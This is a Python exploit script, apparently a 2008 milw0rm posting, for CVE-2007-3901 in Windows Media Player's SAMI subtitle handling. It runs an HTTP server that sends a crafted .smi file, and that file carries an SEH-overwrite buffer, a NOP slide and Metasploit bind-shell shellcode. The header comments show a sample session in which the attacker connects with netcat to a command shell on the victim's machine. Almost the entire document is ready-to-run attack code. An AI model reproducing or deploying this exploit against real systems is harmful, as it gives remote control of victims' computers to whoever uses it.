#!/usr/bin/python
##########################################################################
# Bug discovered by Jun Mao of VeriSign iDefense 
# http://www.securityfocus.com/bid/26789
# CVE-2007-3901
# Coded by Matteo Memelli aka ryujin
# http://www.gray-world.net http://www.be4mind.com
# Tested on: Windows 2000 SP4 English, DirectX 7.0 (4.07.00.0700) 
#------------------------------------------------------------------------
# THX TO all the guys at www.offensive-security.com
# EXPECIALLY TO ONE: THX FOR "NOT" HELPING MUTS!!! 
# I DONT FEEL FC4'd ANYMORE NOW :P muhahahaha
#------------------------------------------------------------------------
##########################################################################  
# On Windows Media Player Open---> http://attacker/anyfile.smi
# .smi extension is necessary, filename can be anything.
#  
# badrobot:/home/matte# ./mplayer.py 
# [+] Listening on port 80
# [+] Connection accepted from: 192.168.1.243
# [+] Payload sent, check your shell on 192.168.1.243 port 4444
# badrobot:/home/matte# nc 192.168.1.243 4444
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\Documents and Settings\ryujin\Desktop>ipconfig
# ipconfig
#
# Windows 2000 IP Configuration
#
# Ethernet adapter Local Area Connection:
#
#        Connection-specific DNS Suffix  . : 
#        IP Address. . . . . . . . . . . . : 192.168.1.243
#        Subnet Mask . . . . . . . . . . . : 255.255.255.0
#        Default Gateway . . . . . . . . . : 
#
# C:\Documents and Settings\ryujin\Desktop>
##########################################################################
 
from socket import *

# SMI BODY
body = """<SAMI>
<HEAD>
<STYLE TYPE="text/css">
<!--
P {
font-size: 1em;
font-family: Arial;
font-weight: normal;
color: #FFFFFF;
background: #000000;
text-align: center;
padding-left: 5px;
padding-right: 5px;
padding-bottom: 2px;
}
.ENUSCC { Name: English; lang: EN-US-CC; }
-->
</STYLE>
</HEAD>
<BODY>
<SYNC Start="0" pippo=\""""

# Metasploit bind shell on port 4444 EXITFUNC seh
shellcode = (
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"
)

body += 21988*'A'                                 
body += '\x90'*16                                 # NOP Slide
body += shellcode + 'C'*67                        # to SEH... 
body += '\xeb\x06\x90\x90\x2b\x1e\xe1\x77'        # ShortJmp, and SEH overwrite
body += '\x90'*4 + '\xE9\x6B\xFE\xFF\xFF\x90\x90' # NearJmp, back to shellcode
body += 143505*'E' + '">'
body += '<P Class="ENUSCC">NICE MOVIE!</P></SYNC></BODY></SAMI>'

# RESPONSE HEADER 
header = (
'HTTP/1.1 200 OK\r\n'
'Content-Type: application/smil\r\n'
'\r\n'
)

evilbuf = header + body
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 80))
s.listen(1)
print "[+] Listening on port 80"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(evilbuf)
print "[+] Payload sent, check your shell on %s port 4444" % addr[0]
c.close()
s.close()

# milw0rm.com [2008-01-08]
